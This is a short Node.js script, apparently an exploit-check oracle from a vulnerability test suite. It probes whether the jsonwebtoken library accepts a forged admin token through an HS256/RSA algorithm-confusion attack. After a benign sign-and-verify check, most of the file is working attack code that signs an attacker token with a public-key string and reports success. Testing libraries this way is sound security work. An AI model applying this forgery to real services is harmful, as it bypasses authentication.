const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const payload = { sub: 'user123', role: 'user' };

  // Benign operation: normal HS256 sign/verify path should work.
  const hsSecret = 'benign-secret';
  const goodToken = jwt.sign(payload, hsSecret, { algorithm: 'HS256' });
  const goodDecoded = jwt.verify(goodToken, hsSecret);
  if (!goodDecoded || goodDecoded.sub !== 'user123') {
    throw new Error('Benign verify did not return expected payload');
  }

  // Only now mark operation as completed.
  operation_completed = true;

  // Malicious operation: algorithm confusion / insecure default handling.
  // Create token signed with HS256 using a value that represents an RSA public key
  // material; vulnerable verification may accept this when verifying without
  // restricting algorithms.
  const fakeRsaPublicKey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtestkeymaterialonly\n-----END PUBLIC KEY-----';
  const attackerToken = jwt.sign({ sub: 'attacker', admin: true }, fakeRsaPublicKey, { algorithm: 'HS256' });

  try {
    const decoded = jwt.verify(attackerToken, fakeRsaPublicKey);
    // If verification succeeds, bypass occurred.
    exploit_succeeded = !!(decoded && decoded.admin === true && decoded.sub === 'attacker');
    evidence = exploit_succeeded
      ? 'verify accepted attacker HS256 token using RSA-like public key input without algorithm restriction'
      : 'verify returned payload but missing expected attacker claims';
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious verify rejected: ' + (e && e.message ? e.message : String(e));
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (e && e.message ? e.message : String(e));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));